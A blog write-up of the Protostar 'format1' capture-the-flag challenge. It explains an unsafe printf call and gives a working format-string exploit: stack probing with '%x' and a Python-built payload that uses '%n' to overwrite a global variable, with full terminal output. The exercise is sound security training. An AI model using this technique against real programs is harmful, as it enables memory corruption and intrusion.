---
layout: post
title:  "Protostar format1 challenge"
date:   2019-02-04 18:26:36 +0530
categories: exploit.education protostar format-one
---
This type of exploit tries to exploit format vulenrabilities in code. Below is the code for [format1][format1-link] challenge.

{% highlight cpp %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  if(target) {
      printf("you have modified the target :)\n");
  }
}
int main(int argc, char **argv)
{
  vuln(argv[1]);
}
Hints
    objdump -t is your friend, and your input string lies far up the stack :)
{% endhighlight %}
Here `printf(string);` is vulnerable to format exploit. It should have been `printf("%s",string);` to prevent the exploit.
As with format exploits we can try with various format specifiers to direct our execution.
First let us try with some random inputs to check behaviour of program.
{% highlight shell %}
user@protostar:/opt/protostar/bin$ ./format1 AAAA
AAAAuser@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ ./format1 AAAABBBBCCCC
AAAABBBBCCCCuser@protostar:/opt/protostar/bin$
804960cuser@protostar:/opt/protostar/bin$ ./format1 "%x %x %x %x"
804960c bffff7f8 8048469 b7fd8304user@protostar:/opt/protostar/bin$
{% endhighlight %}
The program just prints the first argument passed but when we pass `%x` specifier it return some values like addresses.
`%x` specifier prints in `hex` format. Since we donot pass string also to `printf`(we are only pass format), the result is picking whatever there is on stack, which in our case is addresses on stack.
But how do we use it read(and later write to) `target` address `0x08049638`?
{% highlight shell %}
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss	00000004              target
{% endhighlight %}
Thing is the format specifier argument string `%x %x %x %x` is also passed to program on stack.
As we know that arguments to program are kept on stack before `RET`.
So if we read enough memory, we will end up also reading our format specifier passed as argument.
If we pass our address in format specifier, then we can also read it.
{% highlight shell %}
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08' + 'BB' + '%x  '*100+ '%x  '"`"
AAAA8�BB804960c  bffff658  8048469  b7fd8304  b7fd7ff4  bffff658  8048435  bffff828  b7ff1040  804845b  b7fd7ff4  8048450  0  bffff6d8  b7eadc76  2  bffff704  bffff710  b7fe1848  bffff6c0  ffffffff  b7ffeff4  804824d  1  bffff6c0  b7ff0626  b7fffab0  b7fe1b28  b7fd7ff4  0  0  bffff6d8  48c2698  2ed89088  0  0  0  2  8048340  0  b7ff6210  b7eadb9b  b7ffeff4  2  8048340  0  8048361  804841c  2  bffff704  8048450  8048440  b7ff1040  bffff6fc  b7fff8f8  2  bffff81e  bffff828  0  bffff9c7  bffff9d5  bffff9e0  bffff9fd  bffffa10  bffffa1a  bfffff0a  bfffff48  bfffff5c  bfffff73  bfffff84  bfffff8c  bfffff9c  bfffffa9  bfffffd4  bfffffe6  0  20  b7fe2414  21  b7fe2000  10  78bf3bf  6  1000  11  64  3  8048034  4  20  5  7  7  b7fe3000  8  0  9  8048340  b  3e9  c
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08' + 'BB' + '%x  '*150+ '%x  '"`"
AAAA8�BB804960c  bffff598  8048469  b7fd8304  b7fd7ff4  bffff598  8048435  bffff760  b7ff1040  804845b  b7fd7ff4  8048450  0  bffff618  b7eadc76  2  bffff644  bffff650  b7fe1848  bffff600  ffffffff  b7ffeff4  804824d  1  bffff600  b7ff0626  b7fffab0  b7fe1b28  b7fd7ff4  0  0  bffff618  36dd9426  1c8ea236  0  0  0  2  8048340  0  b7ff6210  b7eadb9b  b7ffeff4  2  8048340  0  8048361  804841c  2  bffff644  8048450  8048440  b7ff1040  bffff63c  b7fff8f8  2  bffff756  bffff760  0  bffff9c7  bffff9d5  bffff9e0  bffff9fd  bffffa10  bffffa1a  bfffff0a  bfffff48  bfffff5c  bfffff73  bfffff84  bfffff8c  bfffff9c  bfffffa9  bfffffd4  bfffffe6  0  20  b7fe2414  21  b7fe2000  10  78bf3bf  6  1000  11  64  3  8048034  4  20  5  7  7  b7fe3000  8  0  9  8048340  b  3e9  c  0  d  3e9  e  3e9  17  1  19  bffff73b  1f  bffffff2  f  bffff74b  0  0  0  67000000  6a652792  cbace49b  c9c58ba3  69af5586  363836  0  2f2e0000  6d726f66  317461  41414141  8049638  78254242  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020  78252020
{% endhighlight %}
We see series of `78252020` is read from stack by format specifier, which is just ASCII for `%x  ` which we has passed in format as multiple.
This confirms that format specifier is also passed on stack as argument.
We also see our address `8049638` is stored in stack.
Note that we have placed a single `%x  `. This is to make ensure from which format specifier ie `%x` our `target` address is being fetched(and as we will see later we need to change it)
After playing around with different multiple for format specifier, we get a value for which our `target` address is last.
{% highlight shell %}
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08' + 'BB' + '%x  '*129+ '%x  '"`"
AAAA8�BB804960c  bffff5e8  8048469  b7fd8304  b7fd7ff4  bffff5e8  8048435  bffff7b4  b7ff1040  804845b  b7fd7ff4  8048450  0  bffff668  b7eadc76  2  bffff694  bffff6a0  b7fe1848  bffff650  ffffffff  b7ffeff4  804824d  1  bffff650  b7ff0626  b7fffab0  b7fe1b28  b7fd7ff4  0  0  bffff668  200fb921  a5c2f31  0  0  0  2  8048340  0  b7ff6210  b7eadb9b  b7ffeff4  2  8048340  0  8048361  804841c  2  bffff694  8048450  8048440  b7ff1040  bffff68c  b7fff8f8  2  bffff7aa  bffff7b4  0  bffff9c7  bffff9d5  bffff9e0  bffff9fd  bffffa10  bffffa1a  bfffff0a  bfffff48  bfffff5c  bfffff73  bfffff84  bfffff8c  bfffff9c  bfffffa9  bfffffd4  bfffffe6  0  20  b7fe2414  21  b7fe2000  10  78bf3bf  6  1000  11  64  3  8048034  4  20  5  7  7  b7fe3000  8  0  9  8048340  b  3e9  c  0  d  3e9  e  3e9  17  1  19  bffff78b  1f  bffffff2  f  bffff79b  0  0  0  62000000  2c4a464d  912f6ff2  5d048183  69ff9373  363836  0  0  2f2e0000  6d726f66  317461  41414141  8049638
{% endhighlight %}
So the last `%x` is getting is our required address `8049638`.
But why are we interest in having `target` address as last. Thats because we are going to use `%n` specifier.
This is writes to a given address the number of characters printed before it. eg `printf("111%n", 0xdeadbeef)` would write 3 to address `0xdeadbeef`.
There for we will change our last `%x` to `%n` such that it will point to `target` address and will write number of chars printer before it to it.
{% highlight shell %}
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08' + 'BB' + '%x  '*129+ '%n  '"`"
AAAA8�BB804960c  bffff5e8  8048469  b7fd8304  b7fd7ff4  bffff5e8  8048435  bffff7b4  b7ff1040  804845b  b7fd7ff4  8048450  0  bffff668  b7eadc76  2  bffff694  bffff6a0  b7fe1848  bffff650  ffffffff  b7ffeff4  804824d  1  bffff650  b7ff0626  b7fffab0  b7fe1b28  b7fd7ff4  0  0  bffff668  b824c30f  9277551f  0  0  0  2  8048340  0  b7ff6210  b7eadb9b  b7ffeff4  2  8048340  0  8048361  804841c  2  bffff694  8048450  8048440  b7ff1040  bffff68c  b7fff8f8  2  bffff7aa  bffff7b4  0  bffff9c7  bffff9d5  bffff9e0  bffff9fd  bffffa10  bffffa1a  bfffff0a  bfffff48  bfffff5c  bfffff73  bfffff84  bfffff8c  bfffff9c  bfffffa9  bfffffd4  bfffffe6  0  20  b7fe2414  21  b7fe2000  10  78bf3bf  6  1000  11  64  3  8048034  4  20  5  7  7  b7fe3000  8  0  9  8048340  b  3e9  c  0  d  3e9  e  3e9  17  1  19  bffff78b  1f  bffffff2  f  bffff79b  0  0  0  2a000000  9122a388  553823e7  ad32735f  6990f72c  363836  0  0  2f2e0000  6d726f66  317461  41414141    you have modified the target :)
{% endhighlight %}
And we have successfully modified the target.

[format1-link]:https://exploit.education/protostar/format-one/

